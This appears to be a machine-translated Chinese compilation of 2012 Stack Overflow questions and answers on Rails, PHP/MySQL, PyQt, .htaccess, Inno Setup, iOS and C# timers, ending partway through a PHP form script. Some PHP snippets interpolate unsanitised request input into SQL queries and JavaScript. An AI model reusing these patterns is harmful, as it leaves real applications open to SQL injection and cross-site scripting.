当我点击提交时，我收到错误：

```
Can't mass-assign protected attributes: amenities 
```

知道这里有什么吗？即使我允许 :amenities_attributes 和 accept_nested 标签，它也不会提交。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:37:40.197

你有一个 has_one 关联，所以设施不应该是复数。

改变

```
 <%= f.fields_for :amenity do |a| %> 
```

编辑

```
 <%= f.fields_for :amenity do |a| %>
            <div class="amenities">
                 <%= a.label :smoking, 'Smoking Allowed' %>
                <%= a.check_box :smoking %>
            </div>
         <% end %>
    <p><%= f.submit "Submit" %></p>
     <% end %> 
```

此外，请查看此文档以了解一对一关联，[http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T14:23:15.747

固定的：

```
class Listing < ActiveRecord::Base
  has_one :amenity
  accepts_nested_attributes_for :amenity
  after_initialize do
    self.amenity ||= self.build_amenity()
  end
end 
```

# php - 将大型 xml 文件写入 mysql 表太慢可能是由于 foreach 循环？

> ID：12009133
> 
> 赞同：0
> 
> 时间：2012-08-17T15:56:55.473
> 
> 标签：php, mysql, xml

希望在这里得到一些帮助。我有一个大的 xml 文件（在上面的代码中称为 xml-file.xml）。我在上面的代码中遇到的问题是将所有内容写入数据库非常慢。我认为它很慢的原因是因为该部分循环播放电影并仅将电影名称以逗号分隔的字符串写入表中。我的问题 - 有没有更有效的方法将电影名称转换为逗号分隔的字符串，然后写入表格？提前感谢您的帮助！

XML 标记：

```
 <users>
      <user>
        <id>7280462</id>
        <name>John</name>
        <movies>
          <name>
            <![CDATA[Jack]]>
          </name>
          <description>
            <![CDATA[comedy]]>
          </description>
          <name>
            <![CDATA[Superman]]>
          </name>
          <description>
            <![CDATA[action]]>
          </description>
          <name>
            <![CDATA[Ace Venture]]>
          </name>
          <description>
            <![CDATA[comedy]]>
          </description>
          <name>
            <![CDATA[Major League]]>
          </name>
          <description>
            <![CDATA[sports]]>
          </description>
        </movies>
      </user>
    </users> 
```

我的PHP代码：

```
 $file = 'xml-file.xml';
    $users = simplexml_load_file($file);

    $num_rows = count($users);
    for ($j=0; $j < $num_rows; $j++) { 
        $userid = $users->user[$j]->id;
        $name = $users->user[$j]->name;

        //update table with userid and name
        $db->exec("INSERT INTO table (userid, name) VALUES ('$userid', '$name')");

            //loop through movies and write only movie name to table as comma separated string
            foreach ($users->user$j]->movies as $element) {
              foreach($element as $key => $val) {
                  if ($key != 'description') {
                       //echo "{$key}: {$val}";
                       $title = trim($val).',';
                      $db->exec("UPDATE table set movies = concat(movies,'','$title') where userid = '$userid'");
                    }
              }
            }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:00:38.763

这个怎么样：

```
for ($j=0; $j < $num_rows; $j++) { 
    $userid = $users->user[$j]->id;
    $name = $users->user[$j]->name;
    $titles = "";

    foreach ($users->user$j]->movies as $element) {
        foreach($element as $key => $val) {
            if ($key != 'description') {
                   $titles .= trim($val).',';
            }
        }
    }

    $titles = trim($titles, ",");

    $db->exec("INSERT INTO table (userid, name, movies) VALUES ('$userid', '$name','$titles')");

 } 
```

它一次性生成所有 SQL，因此您只需要一条语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:11:30.507

首先重新调整您的数据库。这将避免使用 concat 等。为此请查看 Google。

您需要确保您的查询知道任何索引，或者如果没有索引，请创建一个。

MySql 中的`EXPLAIN`关键字是你的朋友。它会告诉你发生了什么或没有发生什么。

另外更改 XML 的格式并使用 DOM。

有一个标签“电影”，其中仅包含有关 A 电影的详细信息。

IE

```
<movies>
    <movie>
       <name>Jack</name>
       <description>Comedy</descript>
     </movie>
     <movie>
        <name>Superman</name>
        <description>Action</description>
     </movie>
  ....
</movies> 
```

# python - 将小部件添加到 qtablewidget pyqt

> ID：12009134
> 
> 赞同：14
> 
> 时间：2012-08-17T15:56:59.640
> 
> 标签：python, pyqt, qtablewidget

无论如何在qtablewidget中添加一个按钮？但是单元格内的日期仍然必须显示，例如，如果用户双击一个单元格，我可以像按钮一样发送信号吗？谢谢！

编辑项（）：

```
def editItem(self,clicked):
    if clicked.row() == 0:
        #go to tab1
    if clicked.row() == 1:
        #go to tab1
    if clicked.row() == 2:
        #go to tab1
    if clicked.row() == 3:
        #go to tab1 
```

表触发器：

```
self.table1.itemDoubleClicked.connect(self.editItem) 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-08-17T17:00:48.100

您有几个问题汇总在一起......简短的回答，是的，您可以向 QTableWidget 添加一个按钮 - 您可以通过调用 setCellWidget 将任何小部件添加到表格小部件：

```
# initialize a table somehow
table = QTableWidget(parent)
table.setRowCount(1)
table.setColumnCount(1)

# create an cell widget
btn = QPushButton(table)
btn.setText('12/1/12')
table.setCellWidget(0, 0, btn) 
```

但这听起来不像你真正想要的。

听起来您想对用户双击您的一个单元格做出反应，就好像他们单击了一个按钮，大概是为了打开一个对话框或编辑器或其他东西。

如果是这种情况，您真正需要做的就是从 QTableWidget 连接到 itemDoubleClicked 信号，如下所示：

```
def editItem(item):
    print 'editing', item.text()    

# initialize a table widget somehow
table = QTableWidget(parent)
table.setRowCount(1)
table.setColumnCount(1)

# create an item
item = QTableWidgetItem('12/1/12')
table.setItem(0, 0, item)

# if you don't want to allow in-table editing, either disable the table like:
table.setEditTriggers( QTableWidget.NoEditTriggers )

# or specifically for this item
item.setFlags( item.flags() ^ Qt.ItemIsEditable)

# create a connection to the double click event
table.itemDoubleClicked.connect(editItem) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-08-01T15:18:28.647

在 PyQt4 中将按钮添加到 qtablewidget ：

```
btn= QtGui.QPushButton('Hello')
qtable_name.setCellWidget(0,0, btn) # qtable_name is your qtablewidget name 
```

# .htaccess - 使用一个变量重写 url 的 Htaccess

> ID：12009135
> 
> 赞同：1
> 
> 时间：2012-08-17T15:57:06.903
> 
> 标签：.htaccess, mod-rewrite, url-rewriting

```
RewriteRule page/([0-9]+)$ page.php?id=$1 
```

它可以工作，但包含的链接（如 css 或 js）不起作用。`page/`被视为一个文件夹，因此`<link rel="stylesheet" type="text/css" media="screen" href="css/default.css" />`找不到链接（例如：）。

另一个例子：如果“id”不存在我这样做`ErrorDocument 403 /notfound.php`，但你被重定向到`domain.com/page/notfound.php`。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:12:47.923

试试这个：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule page/([0-9]+)$ page.php?id=$1 
```

仅当请求的文件或目录不存在时才会重定向。

[关于mod_rewrite 的](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)更多信息在这里

**编辑 ：**

至于您找不到资源的问题，您必须将基本标签添加到您的 html 页面中的 head 部分：

```
<base href="/"> 
```

有关[基本标签的更多信息，请点击此处](http://www.w3schools.com/tags/tag_base.asp)

# php - php中包含的javascript在服务器上不起作用，但在本地托管时起作用

> ID：12009137
> 
> 赞同：0
> 
> 时间：2012-08-17T15:57:08.923
> 
> 标签：php, javascript, forms

所以我有这个带有 method="POST" enctype="multipart/form-data" 的表单页面，我将我的操作设置为这个 php 文件。在这个 php 文件中，我将 php 代码包含在标签中，然后将 javascript 代码包含在 php.ini 之后的标签中。我想要它，这样当我提交表单时，php 和 javascript 代码都会运行。当我在我的计算机上本地托管它时，这工作正常。但是，它似乎不适用于我需要托管它的服务器。我在 javascript 代码的第一行添加了一个 alert()，但它没有运行。有谁知道为什么会发生这种情况/我可以调试它的方式？非常感谢。

（我不认为这很重要，但另外表单正在提交到 iframe 以防止页面更改）

-D 用于提交表单的 jQuery：

```
 $("#saved_form").submit(function(e)
            {
            e.preventDefault();
            this.submit();
            ... } 
```

以下是 php/javascript 代码：

```
 <?php
  include 'readFile2.php';
  readText();
  ?>
  <script type='text/javascript'>
  alert("oh no");
  var errors = "<?= $_POST['error'] ?>";
  parent.window.saveLoad = 0;
  //checks if text file is entered
  if (errors == 1) 
  {
   alert("Please enter a text file");
  }
  else if (errors == 2)
  {
  alert("File must be text");
   }
  else
  {
  parent.window.saveLoad = 1;
  parent.window.saved_form = <?php echo json_encode($savedForm); ?>;
  }
  </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:16:26.400

作为对 php 页面的 Ajax 调用，这将更加恰当。

例如：

```
$('#submitbtn).click(function(event){
     event.preventDefault();

    $.ajax({
         url: "readFile2.php",                              
         timeout: 30000,
         type: "POST",
         data: $('#saved_form').serialize(),
         dataType: 'json',
         error: function(XMLHttpRequest, textStatus, errorThrown)  {
              alert("An error has occurred making the request: " + errorThrown)
         },
         success: function(data){   
              alert('it works.  You can do more on success of submit here');
         }                                                                                              
     });
 }); 
```

所以，总而言之，上面的代码对一个名为“readFile2.php”的文件进行了 ajax 调用) 它期望返回 json 数据（可以更改为文本、html 等）并在帖子成功时提醒“它可以工作......”。PHP 文件必须接受发布的数据，对其进行处理，然后回显您想要返回文件的内容。我更喜欢发送提交状态的 json 字符串，这样我就可以告诉我的界面是否检查失败，以防止错误数据进入数据库。您的表单提交确实有服务器端保护....对吗？！？

# exe - 是否可以将文件插入到exe中？

> ID：12009142
> 
> 赞同：4
> 
> 时间：2012-08-17T15:57:47.550
> 
> 标签：exe, inno-setup

我需要在下载时将生成的文件插入到 exe 中。目前，我创建了一个“空”文件（填充了重复字符）并将其与 exe 打包在一起。下载时，我查看安装程序的字节，通过查找重复字符找到文件，然后插入生成的文件。

但是，此过程不起作用。重复字符只是不显示在字节中。但我确定文件在那里，因为如果我运行 exe，它就会被解压。我做错了什么或者甚至可能将文件插入到 exe 中？

另请注意，我正在使用 Inno Setup Script v5.5.1 将项目编译为 exe。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T02:12:28.117

如果要更改在 [Files] 条目中指定并编译到 setup 可执行文件中的文件的内容，则必须：

1.  制作一个至少与您要插入的最大内容一样大的虚拟文件。
2.  使用独特且易于区分的内容填充文件（或至少前 64 个字节左右）。
3.  使用“nocompression noencryption dontverifychecksum”标志标记其 [Files] 条目。

然后，您应该能够扫描生成的可执行文件以查找#2 中的标记，然后替换您想要的数据。但是请注意，这样做可能会使设置文件上的任何数字签名无效，尽管我还没有对此进行测试以确定。

请注意，如果您插入的内容小于虚拟文件大小，则额外的字节仍将保留在插入内容的末尾。因此，无论读取文件的内容都必须有某种方法来忽略它或识别有趣内容的结尾。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:21:41.787

因此，如果您在现有的 exe 文件中进行更改，并且文本不多，您可以使用一些十六进制编辑器并在所需位置进行更改。如果 text 是 more ，您可能希望包含一些无意义的字节，就像填充物一样。

# html - 知道是什么导致此页面无法在 IE9 中显示吗？

> ID：12009147
> 
> 赞同：0
> 
> 时间：2012-08-17T15:58:06.623
> 
> 标签：html, wordpress, iis-7, cross-browser, internet-explorer-9

该页面在以下情况下显示良好：

*   OSX 上的 Chrome 21
*   OSX 上的火狐 14
*   Windows XP VM 上的 Internet Explorer 8（关闭兼容模式）

但是，该页面仅在 Internet Explorer 9 (Windows 7 VM) 中显示标题背景。有任何想法吗？网站暂时设[在这里。](http://goo.gl/dVrfp)

编辑~所有子页面在 IE9 中都可以正常加载...只有主页拒绝加载。这是一个[子页面](http://goo.gl/vcQnL)的链接。

编辑 2~ 我开始相信这是一个服务器问题。我们正在运行 IIS7 服务器。在一天中 50% 的时间里，该网站在所有浏览器上都运行良好。然后在一天的另外 50% 中，IE8-9 将无法正确显示，除非您在 URL 的末尾附加**index.php**或在开头附加**https:// 。**有什么建议吗？我正在考虑开始一个新话题来获得更多关注，但我也不想让 stackoverflow 社区感到不安。

编辑 3~ 原来这不是服务器问题（或者可能是，但我最终修复了它）。WP Super Cache 是罪魁祸首。禁用该插件后，问题就解决了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T18:03:54.490

我检查了 DOM，看起来 IE9 将页面渲染到这段 javascript：

```
<!-- function clickIE4(){ ... 
```

这是一个从不关闭的开放评论标签。

看两张截图：

这是 IE9 开发人员工具的输出，页面仅在包含上述代码的打开脚本标记之前呈现。

![IE9开发者工具截图](../Images/e59308d5763d4a4ae6dfd5555218b660.png)

chrome 开发人员工具输出如下所示。我猜它的解析引擎会在关闭`</script>`标签之后自动关闭打开的 HTML 注释。

![Chrome 开发者工具截图](../Images/32ef5d380074dfccf6e9a64b911cf951.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:09:50.800

您需要制作 html5 标签的块级元素：

```
article, aside, figcaption, figure, footer, header, hgroup, menu, nav, section {
    display: block;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T17:28:19.723

页面上有很多 html 错误。修复这些可能会有所帮助。特别是你有一个没有开始 P 标签的结束 P 标签，并且你在 BODY 中有一个 STYLE 标签。样式标签只能在 HEAD 中使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-21T20:07:29.723

在尝试了此处发布的几乎所有答案之后，似乎没有任何效果。所以我决定禁用/重新启用我所有的插件只是为了看看其中一个是否是原因......原来 WP Super Cache 是罪魁祸首。一旦禁用此功能，该页面就可以正常工作！不完全确定为什么，但我觉得这需要发布，以防其他人有类似的问题。

# objective-c - 使用 transitionFromViewController:toViewController:duration 在 UIViewControllers 之间自定义动画

> ID：12009154
> 
> 赞同：7
> 
> 时间：2012-08-17T15:58:21.593
> 
> 标签：objective-c, ios5

我正在尝试使用`UIViewController`'transitionFromViewController:toViewController:duration 方法，但使用自定义动画。

我将以下两个视图控制器作为子级添加到自定义容器 UIViewController：

1.  firstController - 这是 UITabBarController 的一个实例
2.  secondController - 这是 UIViewController 的子类

以下代码按预期工作：

```
[self transitionFromViewController:firstController
                  toViewController:secondController 
                          duration:2                                         
                           options:UIViewAnimationOptionTransitionFlipFromLeft  
                        animations:^(void){} 
                        completion:^(BOOL finished){}]; 
```

但是，我想创建一个自定义动画，其中 where`firstController`向左滑动并被`secondController`从右侧滑入取代，类似于 UINavigationControllers push 和 pop 方法的工作方式。更改为之后`options`，`UIViewAnimationOptionTransitionNone`我尝试在`animations`块中实现自定义动画，但绝对没有成功。 `firstController`立即换成`secondController`无和动画。

我真的很感激任何帮助。

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-19T09:28:14.723

这实际上很容易。出于某种原因，我认为`secondController`'s 的观点会低于/落后于 's 的观点`firstController`。我只是试图为`firstController`' 的视图设置动画。这当然是错误的。一旦`transitionFromViewController:toViewController:duration`被称为`secondController`的视图被放置在`firstController`的视图之上。以下代码有效：

```
CGFloat width = self.view.frame.size.width;
CGFloat height = self.view.frame.size.height;

secondController.view.frame = CGRectMake(width, 0, width, height);

[self transitionFromViewController:firstController
    toViewController:secondController
    duration:0.4
    options:UIViewAnimationOptionTransitionNone
    animations:^(void) {
        firstController.view.frame = CGRectMake(0 - width, 0, width, height);
        secondController.view.frame = CGRectMake(0, 0, width, height);
    } 
    completion:^(BOOL finished){
        [secondController didMoveToParentViewController:self]; 
    }
]; 
```

# c# - 每 x 秒同时启动多个功能？

> ID：12009158
> 
> 赞同：1
> 
> 时间：2012-08-17T15:58:39.693
> 
> 标签：c#, .net, multithreading

我知道如何在 x 秒内启动一个函数，它是[这样](https://stackoverflow.com/questions/6169288/execute-specified-function-every-x-seconds)的：

```
private Timer timer1; 
public void InitTimer()
{
    timer1 = new Timer();
    timer1.Tick += new EventHandler(timer1_Tick);
    timer1.Interval = 2000; // in miliseconds
    timer1.Start();
}

private void timer1_Tick(object sender, EventArgs e)
{
    function1();
    function2();
    function3();
} 
```

这里的问题：这些功能不能同时运行。`Function2`只有`Function1`完成后才能运行。但我希望它们同时运行。这就是为什么我可以这样做：

```
private void timer1_Tick(object sender, EventArgs e)
{
   Parallel.Invoke(
     () => Function1(),
     () => Function2(),
     () => Function3()
   );
} 
```

这是在 C# 中最聪明的方法吗？我不明白的是`Parallel.Invoke`：如果我的计时器设置为 5 秒并且在 5 秒后功能 1、2 和 3 没有完成但我再次调用它们怎么办。我是否在**新**线程中启动这些功能？是否有一些调用 x-threads 运行 function1() （同时）？想知道这真的很健康。

如果有人想获取更多信息：`function1`是否只是将文件 x 从文件夹 a 复制到 b，`function2`是否仅用于读取文件夹 b 中的所有文件并保存信息，`function3`是否仅用于检查连接以及是否存在连接将适当的文件发送给某人。

对代码有什么建议吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:04:04.143

Parallel.Invoke 并行运行所有函数。由于函数 2 不应在函数 1 之前运行，因此创建一个在后台按顺序运行它们的任务。

```
Task.Factory.StartNew(() =>
{
    function1();
    function2();
    function3();
}); 
```

> 如果我的计时器设置为 5 秒并且在 5 秒后功能 1、2 和 3 没有完成怎么办

您可以使用 a`bool`查看它们是否已完成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-19T09:57:30.333

用于`System.Threading.Timer`在线程上安排回调`ThreadPool`，因此您无需创建新任务。它还允许您控制间隔以防止回调重叠。

```
// fired after 5 secs, but just once.
_timer = new System.Threading.Timer(Callback, null, 5000, Timeout.Infinite);

// on the callback you must re-schedule the next callback time;
private void Callback(Object state) {
   Function1();
   Function2();

   // schedule the next callback time 
   _timer.Change(5000, Timeout.Infinite);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:02:43.317

你看过任务吗？

*   [http://msdn.microsoft.com/en-us/library/dd537610](http://msdn.microsoft.com/en-us/library/dd537610)

你可以这样做：

```
Task[] tasks = new Task[3];
tasks[0] = Task.Factory.StartNew(() => Function1());
tasks[1] = Task.Factory.StartNew(() => Function2());
tasks[2] = Task.Factory.StartNew(() => Function3());
Task.WaitAll(tasks); 
```

以上将允许您并行运行这些功能，这就是您想要的。

如果您不想在`timer1_Tick`等待所有任务完成的过程中阻塞，则不要使用 WaitAll...。相反，当您的计时器再次触发时，您可以通过检查任务上的 IsCompleted 来检查任务是否已完成。 ...然后决定是否发出下一批函数。

# web-services - 还有其他 Flex 服务代码生成插件吗？

> ID：12009163
> 
> 赞同：1
> 
> 时间：2012-08-17T15:59:08.360
> 
> 标签：web-services, apache-flex, actionscript, code-generation, wcf-data-services

在 Flash Builder 4 中，您可以设置要为数据/服务实用程序使用的代码生成器。我唯一的选项是“默认”，我无法找到是否有任何其他选项，以及如何使用它们。

我不喜欢默认代码生成器的工作方式，所以我很想知道实现我们自己的代码生成器有多么困难，或者是否有更好的代码生成器。所以我想我的问题是：在最新版本的 flash builder 中它会变得更好，还是有其他好的选择？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T23:27:34.350

您的服务器端技术是什么？如果您使用 Java，这是一个可能的答案。

GraniteDs - [http://www.graniteds.org](http://www.graniteds.org) - 它是 BlazeDs 的替代品，包括自动生成类型化的 AS3 对象（valueObjects）和 AS3 服务代理。此功能可作为 Eclipse、Maven 和 Ant 的插件使用。

请参阅 GraniteDs 文档的第 5 章。 [http://www.graniteds.org/public/docs/2.3.2/docs/reference/en-US/html/graniteds.gas3.html#gas3.overview](http://www.graniteds.org/public/docs/2.3.2/docs/reference/en-US/html/graniteds.gas3.html#gas3.overview)

# ios - NSMutableDictionary 的错误设置值

> ID：12009164
> 
> 赞同：0
> 
> 时间：2012-08-17T15:59:09.357
> 
> 标签：ios, nsmutabledictionary

我初始化这个`NSMutableDictionary`：

```
define TAREFA      @"TAREFA"  
define DATA_ITEM        @"DATA"   
define HORA_ITEM        @"HORAS"  
define ID          @"ID"  
define STATE       @"NA"  
define APROVED     @"APROVED"  
define REJECTED    @"REJECTED" 

    itensArray = [[NSMutableArray alloc] init];

    for (int i=0; i< [listagens size]; i++)
    {   
        NSMutableDictionary *tmpDictionary = [[NSMutableDictionary alloc] initWithObjectsAndKeys:
                                        [[listagens item:i] WI_ID], ID,
                                        [[listagens item:i] WI_TEXT], TAREFA,
                                        [[listagens item:i] WI_CD], DATA_ITEM,                                            
                                        [[listagens item:i] WI_CT], HORA_ITEM,                                                                                     
                                        STATE, STATE,
                                        nil];

        [itensArray addObject:tmpDictionary];           
    } 
```

稍后，我执行以下操作：

```
 for (int i=0; i<[itensArray count]; i++) 
    {
        if ([[[itensArray objectAtIndex:i] objectForKey:ID] isEqualToString:cell.idLabel.text]) {
            [[itensArray objectAtIndex:i] setString:APROVED forKey:STATE];
            break;
        }
    } 
```

我初始化了数组，然后，我更改了 NSMutableDictionary 的字符串。当我设置值时，我得到以下运行时错误：

> 'NSInvalidArgumentException'，原因：'-[__NSCFDictionary setString:forKey:]：无法识别的选择器发送到实例 0x7b7d170'

看来我没有正确更改值。是语法错误吗？它是如何完成的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:05:27.467

也许您拼错了方法的名称。

```
// WRONG
[[itensArray objectAtIndex:i] setString:APROVED forKey:STATE];

// GOOD
[[itensArray objectAtIndex:i] setValue:APROVED forKey:STATE]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:03:20.763

'NSInvalidArgumentException'，原因：'-[__NSCFDictionary setString:forKey:]：无法识别的选择器发送到实例 0x7b7d170'

NSMutableDictionary 没有 setString:forKey: 方法。

尝试 setObject:forKey:

```
[[itensArray objectAtIndex:i] setObject:APROVED forKey:STATE]; 
```

# javascript - IE7 不加载 javascript 文件

> ID：12009165
> 
> 赞同：0
> 
> 时间：2012-08-17T15:59:09.513
> 
> 标签：javascript, jquery, html, css, internet-explorer

互联网上有很多关于这个问题的信息，但是我找不到非常具体的信息。

我一直在使用新的欧盟 cookie 法律信息 (javascript) 更新网站。我刚刚注意到 ie7 的某处没有加载 javascript 文件。用警报测试，它没有显示。

脚本包括：

```
<script src="http://code.jquery.com/jquery-latest.js"></script> 
<script src="cookiesJs/jquery.cookie.js"></script>
<script src="cookiesJs/c.js"></script> 
```

c.js：

```
document.write('<style type="text/css">a{text-decoration: none;}#cookieMessage {font-family: Arial, Helvetica, sans-serif;color: #222;background-color: #D1D3D4;padding: 8px;height: auto;position: fixed;width:200px;margin: 0px 0px 0 0;bottom:0px;right:10px;border:#FFF 2px solid;border-bottom:0px;padding: 0px 8px 8px 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;-webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;border-top-right-radius: 8px;border-top-left-radius: 8px;text-align:left;overflow:hidden;z-index:999999;}#cookieMessage h6 {font-size: 14px;text-transform: uppercase;padding: 0px;margin-top: 8px;margin-right: 0px;margin-bottom: 5px;margin-left: 0px;color: #222;}#cookieMessage img {border:0px;}#cookieMessage p {text-align: left;font-size: 11px;padding: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 2px;margin-left: 0px;color: #222;}#cookieMessage p a {color: #333;}#cookieMessage h6 a {color: #333;text-decoration: none;}#arrow{margin-top: -20px;}</style>');
$(document).ready(function(){
    $("#polup").toggle(function(){
        $("#cookieMessage").animate({height:120},500);
        $("#arrow").animate({height:0},160);
    },function(){
        $("#cookieMessage").animate({height:22},500);
        $("#arrow").animate({height:14},160);
    });
});

var accepted = get_cookie("accepted");
if(accepted == null){
    document.cookie = "accepted=no; path=/"; // initialize the cookie
}

function accept(){
    // when the client clicks accept
    $("#cookieMessage").fadeOut();
    $.cookie("accepted", "yes", {
       expires : 360,           //expires in 10 days
       path    : '/',          //The value of the path attribute of the cookie 
    });
}
function get_cookie ( cookie_name )
// method to retrieve a cookie based upon its name entered
    {
      var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );

      if ( results )
        return ( unescape ( results[2] ) );
      else
        return null;
    }
var x = get_cookie("consentCookie");
    if(x == null){
        document.cookie = "consentCookie=yes; path=/";
        location.reload();
    }var x = get_cookie("consentCookie");
        if((x == "yes") && (accepted == "no")){

        //if the cookie does not exist it is the users first time on the page
        document.cookie = "consentCookie=no; path=/";
        var policy = '<div id="cookieMessage"><h6>Cookie Policy</h6><p>Our website uses cookies. By using our website and agreeing to this policy, you consent to our use of cookies.<a href="cookie_policy.htm">Find out more about cookies.</a></p><p><a href="#" onclick="accept();"><img src="cookiesJs/cookieimg/cookie.gif" width="20" height="20" alt="cookie" style="margin-bottom:-5px;" /> I accept</a></p></div>';
        document.write(policy);
    }else if((x == "no") && (accepted == "no")){
        // if they have visited before but not accepted
        document.write('<div id="cookieMessage">');
        var policy = '<a href="#_" id="polup"><h6>Cookie Policy</h6> <img id="arrow" align="right" src="cookiesJs/cookieimg/arrow.gif" width="18" height="14" alt="arrow" /></a></h6>';
        document.write(policy);
        document.write('<p>Our website uses cookies. By using our website and agreeing to this policy, you consent to our use of cookies.</p><p><a href="cookie_policy.htm">Find out more about cookies.</a></p><p><a href="#" onclick="accept();"><img src="cookiesJs/cookieimg/cookie.gif" width="20" height="20" alt="cookie" style="margin-bottom:-5px;" /> I accept</a></p></div>');
        $("#cookieMessage").css("height","20");
    }else{
        //if they  have visited and accepted
        document.write('<div id="cookieMessage" style="display: none"><h6>Cookie Policy</h6></div>');
    } 
```

我不明白为什么 IE 不加载文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:02:59.490

可能是编译问题：

你有一行这样说：

```
}var x = get_cookie("consentCookie"); 
```

看起来像复制/粘贴问题。

我发现有时 IE7 会在出现错误时拒绝空白，而其他浏览器会“尽力而为”并加载/执行他们所能做的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:39:33.500

尾随[逗号](http://trailingcomma.com/)

```
 path    : '/',          //The value of the path attribute of the cookie 
```

删除尾随逗号和魔法应该会发生，并且您的代码应该可以工作。

# visual-studio - 当您有多个 GPU 时如何在 Visual Studio 中的 Nsight 中进行调试

> ID：12009171
> 
> 赞同：0
> 
> 时间：2012-08-17T15:59:31.623
> 
> 标签：visual-studio, debugging, cuda, gpu, nsight

有谁知道如何在调试时在 Visual Studio 中的 Nsight 中切换 GPU，我正在编写 2 个 quadro 卡。代码在 cuda C 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T06:37:16.987

您可以在 CUDA 程序中枚举您的卡片，并明确选择其中一张。或者您可以在启动 Nsight Monitor 之前设置环境变量，“CUDA_VISIBLE_DEVICES=0”选择序号为 0 的卡。

您可以参考 CUDA SDK 中的 deviceQueryDrv 示例，列出 GPU 的序号。您还可以参考如何枚举 GPU。

# jquery - JQuery 验证引擎在 WordPress 页面中不起作用

> ID：12009172
> 
> 赞同：0
> 
> 时间：2012-08-17T15:59:32.547
> 
> 标签：jquery, wordpress, jquery-validation-engine

我在名为 newuser.php 的文件中有一个相当复杂的表单。我正在使用一个 WordPress 插件，它允许在 post/page php 中将文件包含在 WordPress 页面中（我使用的是 Sufffusion 主题）。我也在尝试开发自己的插件（第一次），我正在使用它来排队所有必要的脚本和 css 文件。我正在页脚中加载我的 javascript 文件，而 jquery 本身正在页眉中加载。

据我所知，我已经正确实例化了 jquery.validationEngine 并为每个表单元素提供了正确的类。如果我将“个人信息”字段集粘贴到包含所有 javascript 的 html 文档中，它会完全按照预期的方式工作。但是，在 WordPress 页面内绝对没有任何反应。我花了两天的大部分时间试图寻找答案但没有成功。

可以在此处查看该页面：[http](http://uniquelyyours.blogdns.com/test/?id=I17) ://uniquelyyours.blogdns.com/test/?id=I17 ID 参考是表单正常工作所必需的。要进行测试，请使用单选按钮“我的”并选择祖父作为关系。以下是包含的 php 文件的代码，格式如下：

```
 <?php
$tng_folder = get_option('mbtng_path');
chdir($tng_folder);
include('begin.php');
include_once($cms['tngpath'] . "genlib.php");
include($cms['tngpath'] . "getlang.php");
include($cms['tngpath'] . "{$mylanguage}/text.php");
mbtng_db_connect() or exit;

$id = $_GET['id'];
//Check to make sure the variable has been passed correctly. If not, error message.
if (!isset($_GET['id'])){
    echo "<p style=\"color: #f00;\"><b>You can't register without showing your relationship in our tree ... Please go <a href=\"".$_SERVER['HTTP_REFERER']."\">back and search for your relative first.</a></b></p><br/><br/>";
}

//Get the relevant row from the database
$select = "SELECT * FROM tng_people WHERE personID='$id' ";
$query = mysql_query($select);
$f = mysql_fetch_array($query);
$first = $f['firstname'];
$last = $f['lastname'];
$name = ($first.' '.$last) ;
$readonly = "<input type=\"text\" name=\"aname\" value=\"$name\" size=\"40\" maxlength=\"40\" readonly=\"readonly\"/>";
$read = "<input type=\"text\" name=\"newid\" id=\"x\" value=\"$id\" readonly=\"readonly\"/>";
$url="http://".$_SERVER['HTTP_HOST']."/user-registration/success/?try=1";
$relation = mysql_real_escape_string(stripslashes($_POST['relation']));
$aname = mysql_real_escape_string(stripslashes($_POST['aname']));
$personid = $_POST['newid'];

//Grab the posted variables
$whom = $_POST['whom'];
//parents
$father_firstname = mysql_real_escape_string(stripslashes($_POST['father_firstname']));
$father_lastname = mysql_real_escape_string(stripslashes($_POST['father_lastname']));
$father_birthdate = mysql_real_escape_string(stripslashes($_POST['father_birthdate']));
$mother_firstname = mysql_real_escape_string(stripslashes($_POST['mother_firstname']));
$mother_maidenname = mysql_real_escape_string(stripslashes($_POST['mother_maidenname']));
$mother_birthdate = mysql_real_escape_string(stripslashes($_POST['mother_birthdate']));
$parents_mar_date = mysql_real_escape_string(stripslashes($_POST['parents_mar_date']));
//grandparents
$grandfather_firstname = mysql_real_escape_string(stripslashes($_POST['grandfather_firstname']));
$grandfather_lastname = mysql_real_escape_string(stripslashes($_POST['grandfather_lastname']));
$grandfather_birthdate = mysql_real_escape_string(stripslashes($_POST['grandfather_birthdate']));
$grandmother_firstname = mysql_real_escape_string(stripslashes($_POST['grandmother_firstname']));
